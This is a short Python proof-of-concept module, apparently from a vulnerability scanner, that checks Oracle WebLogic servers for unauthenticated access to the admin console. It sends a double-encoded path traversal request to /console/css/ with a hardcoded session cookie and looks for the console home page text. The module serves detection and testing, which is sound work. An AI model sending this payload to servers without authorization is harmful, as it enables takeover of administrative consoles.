# -*- coding:utf-8 -*-
# weblogic_控制台未授权

from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def fingerprint(self):
        try:
            if self.service.url:
                resp = self.requestUtil.get(self.service.url + "/console")
                if resp.status_code == 200:
                    return True
        except:
            return False

    def poc(self):
        try:
            resp = self.requestUtil.get(self.service.url + "/console/css/%252e%252e%252fconsole.portal",
                                   cookies="ADMINCONSOLESESSION=kzJbgq1R262PK2BDhyXyRLvYb534FM2RCPbzv05nDpwk3tGWxGcR!-1057352602")
            if "控制台主页" in resp.text:
                return ["weblogic_控制台未授权", "/console/css/%252e%252e%252fconsole.portal"]
        except:
            return []
